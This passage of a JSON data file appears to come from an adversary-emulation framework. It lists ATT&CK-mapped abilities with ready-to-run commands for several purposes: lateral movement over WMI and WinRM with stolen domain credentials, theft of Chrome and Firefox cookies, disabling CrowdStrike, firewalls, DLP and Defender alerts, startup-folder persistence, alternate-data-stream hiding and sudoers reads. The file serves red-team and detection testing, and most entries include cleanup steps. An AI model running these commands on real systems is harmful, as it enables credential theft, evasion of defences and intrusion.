"T1021.004", "tactic": "lateral-movement", "requirements": [], "name": "Start 54ndc47", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Remotely executes 54ndc47 over WMI", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["$node = '''#{remote.host.fqdn}''';\n$user = '''#{domain.user.name}''';\n$password = '''#{domain.user.password}''';\nwmic /node:$node /user:$user /password:$password process call create \"taskkill /f /im s4ndc4t.exe\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$node = '''#{remote.host.fqdn}''';\n$user = '''#{domain.user.name}''';\n$password = '''#{domain.user.password}''';\nwmic /node:$node /user:$user /password:$password process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["$node = '''#{remote.host.fqdn}''';\n$user = '''#{domain.user.name}''';\n$password = '''#{domain.user.password}''';\nwmic /node:$node /user:$user /password:$password process call create \"taskkill /f /im s4ndc4t.exe\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$node = '''#{remote.host.fqdn}''';\n$user = '''#{domain.user.name}''';\n$password = '''#{domain.user.password}''';\nwmic /node:$node /user:$user /password:$password process call create \"cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03", "technique_id": "T1047", "tactic": "execution", "requirements": [{"relationship_match": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_admin", "target": "domain.user.name"}], "module": "plugins.stockpile.app.requirements.req_like"}, {"relationship_match": [{"source": "remote.host.fqdn"}], "module": "plugins.stockpile.app.requirements.no_backwards_movement"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "isAccessibleFrom"}], "module": "plugins.stockpile.app.requirements.reachable"}], "name": "Start 54ndc47 (WMI)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Start Agent using WinRM (WinRM)", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["sandcat.go-windows"], "parsers": [], "cleanup": ["$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: Windows Remote Management", "ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921", "technique_id": "T1021.006", "tactic": "lateral-movement", "requirements": [], "name": "Start Agent (WinRM)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1539ChromeCookies.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue; \"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c $env:temp\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" | out-file -filepath \"$env:temp\\T1539ChromeCookies.txt\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal Web Session Cookie", "ability_id": "f0a6a8fe9ec4afd504d22c509a9660e9", "technique_id": "T1539", "tactic": "credential-access", "requirements": [], "name": "Steal Chrome Cookies (Windows)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1539FirefoxCookies.txt -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue; $CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"; \"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c $env:temp\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$CookieDBLocation\" | out-file -filepath \"$env:temp\\T1539FirefoxCookies.txt\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal Web Session Cookie", "ability_id": "1690470fc24d4f33da5858999f955d2a", "technique_id": "T1539", "tactic": "credential-access", "requirements": [], "name": "Steal Firefox Cookies (Windows)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stop and disable Crowdstrike Falcon on Linux\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo systemctl enable falcon-sensor.service; sudo systemctl start falcon-sensor.service"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo systemctl stop falcon-sensor.service; sudo systemctl disable falcon-sensor.service", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "bc55c3967731490dc44e0f05b55b250d", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Stop Crowdstrike Falcon on Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Kill all PowerShell processes", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Process -Name \"powershell\" | Stop-Process", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "134b49a3-3f93-41bd-85f4-563eadbb6055", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Stop PowerShell processes", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Stop-Service -Name McAfeeDLPAgentService; Remove-Service -Name McAfeeDLPAgentService", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "f5b48f9f8e01db3edd487c05580a0e90", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Stop and Remove Arbitrary Security Windows Service", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.falcond.plist; sudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist; sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "8b5fb5a437fad691a2764514f0c022ee", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Stop and unload Crowdstrike Falcon on macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "fw.disabled"}]}], "cleanup": ["ufw enable; ufw status verbose"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ufw disable", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "8478297ebb155b34c412a0fde335eccd", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [{"relationship_match": [{"source": "root"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Stop/Start UFW firewall", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "fw.disabled"}]}], "cleanup": ["systemctl start ufw; systemctl status ufw"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "systemctl stop ufw", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "da03142f3c859db6a08d57accc7d2aa8", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [{"relationship_match": [{"source": "root"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Stop/Start UFW firewall systemctl", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {;     New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki;     }; Start-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: NTFS File Attributes", "ability_id": "8da7c7a6e9a5b3bf95107b38230b09f6", "technique_id": "T1564.004", "tactic": "defense-evasion", "requirements": [], "name": "Store file in Alternate Data Stream (ADS)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Common Sudo enumeration methods.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo -l      ; sudo cat /etc/sudoers; sudo vim /etc/sudoers", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo -l      ; sudo cat /etc/sudoers; sudo vim /etc/sudoers", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "ability_id": "dd1eadab4aa421d3a0048c3c85bf60e3", "technique_id": "T1548.003", "tactic": "multiple", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Sudo usage", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "2ebcdf9d130bd9f0c4493c9e2d211413", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Suppress Win Defender Notifications", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["set -o history"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "set +o history", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "69ac4d0ed190b9442fca7e16f649a2be", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Suspend History", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "ability_id": "c3f3b1ce2eb966f2c2d64e39fb6afba1", "technique_id": "T1059.003", "tactic": "execution", "requirements": [], "name": "Suspicious Execution via Windows Command Shell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["bea90a_batstartup.bat"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item bea90a_batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Copy-Item bea90a_batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"; Start-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Start-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "ce6632edd5ed72863c2300e15c9114bb", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Suspicious bat file run from startup Folder", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["d2a901_jsestartup.jse"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item d2a901_jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; Copy-Item d2a901_jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"; cscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; cscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "16e6823c4656f5cd155051f5f1e5d6ad", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Suspicious jse file run from startup Folder", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["b6dec5_vbsstartup.vbs"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item b6dec5_vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; Copy-Item b6dec5_vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"; cscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; cscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "697e8a432031075e47cccba24417013d", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Suspicious vbs file run from startup Folder", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Script Proxy Execution", "ability_id": "cf9f1e588dbaa2fe7062287bcb2315d6", "technique_id": "T1216", "tactic": "defense-evasion", "requirements": [], "name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Process discovery via SysInternals pstool", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "cc191baa-7472-4386-a2f4-42f203f1acfd", "technique_id": "T1057", "tactic": "collection", "requirements": [], "name": "SysInternals PSTool Process Discovery", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path $env:temp\\rad*.tmp -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$TokenSet = @{;   U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ';   N = [Char[]]'0123456789'; }; $Upper = Get-Random -Count 5 -InputObject $TokenSet.U; $Number = Get-Random -Count 5 -InputObject $TokenSet.N; $StringSet = $Upper + $Number; $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''; $file = \"rad\" + $rad + \".tmp\"; whoami.exe /all >> $env:temp\\$file", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "725f6e03f3e2098c4303861566f18894", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "System Discovery - SocGholish whoami", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$syntaxList = \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" ; foreach ($syntax in $syntaxList) {; PathToAtomicsFolder\\T1049\\bin\\SharpView.exe $syntax -}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Connections Discovery", "ability_id": "0869b5ecbbe4324d7858ba54addfd9b0", "technique_id": "T1049", "tactic": "discovery", "requirements": [], "name": "System Discovery using SharpView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item \"$env:allusersprofile\\cmd.exe\" -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"; start-process \"$env:allusersprofile\\cmd.exe\"; sleep -s 5 ; stop-process -name \"cmd\" | out-null", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Masquerading", "ability_id": "bc456ce28da22e33b96257b6ae020391", "technique_id": "T1036", "tactic": "defense-evasion", "requirements": [], "name": "System File Copied to Unusual Location", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "systeminfo && reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "dca8b042fcdffcc1f5cddcff4122c434", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "System Information Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System Info\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "system_profiler; ls -al /Applications", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "44705da4b28c8fa57fc2a2940b34565a", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "System Information Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver 